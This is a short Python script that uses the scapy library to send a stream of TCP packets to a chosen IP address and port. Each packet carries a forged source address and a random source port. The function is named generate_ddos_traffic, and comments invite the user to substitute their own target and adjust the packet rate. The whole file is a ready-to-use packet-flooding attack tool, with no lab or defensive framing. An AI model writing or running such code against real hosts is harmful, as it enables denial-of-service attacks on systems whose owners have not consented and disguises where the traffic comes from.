from scapy.all import send, IP, TCP
import random
import time

def generate_ddos_traffic(target_ip, port, packet_count):
    for _ in range(packet_count):
        src_ip = "192.168.1.1"  # You can use any IP address you want to simulate as the attacker
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=port)
        send(packet, verbose=False)
        time.sleep(0.01)  # Adjust the sleep time to control the traffic rate

if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with the target IP address
    port = 80  # Replace with the target port
    packet_count = 1000  # Number of packets to send
    generate_ddos_traffic(target_ip, port, packet_count)
